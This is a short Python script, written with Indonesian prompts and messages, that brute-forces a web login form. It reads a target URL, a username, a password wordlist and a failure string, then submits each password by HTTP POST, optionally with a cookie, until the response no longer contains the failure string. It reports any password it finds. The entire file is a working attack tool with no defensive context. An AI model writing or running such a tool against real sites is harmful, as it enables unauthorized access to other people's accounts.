import requests
from termcolor import colored

url = input('[+] Masukkan URL: ')
username = input('[+] Masukkan username untuk Bruteforce: ')
file_pwd = input('[+] Masukkan file kata sandi: ')
string_gagal = input('[+] Masukkan string yang muncul jika login gagal: ')
cookie_value = input('Masukkan nilai cookie (jika ada): ')

def cracking(username, url):
    with open(file_pwd, 'r') as password_file:
        passwords = password_file.readlines()
        total_passwords = len(passwords)
        cracked = False

        for index, password in enumerate(passwords):
            password = password.strip()
            print(colored(('Mencoba kata sandi ke-' + str(index + 1) + ' dari ' + str(total_passwords) + ': ' + password), 'red'))
            data = {'username': username, 'password': password, 'Login': 'submit'}
            if cookie_value != '':
                response = requests.post(url, data=data, cookies={'Cookie': cookie_value})
            else:
                response = requests.post(url, data=data)
            if string_gagal in response.content.decode():
                pass
            else:
                print(colored(('[+] Username ditemukan: ==> ' + username), 'green'))
                print(colored(('[+] Kata sandi ditemukan: ==> ' + password), 'green'))
                cracked = True
                break

        if not cracked:
            print('[!!] Kata sandi tidak ditemukan dalam daftar')

cracking(username, url)
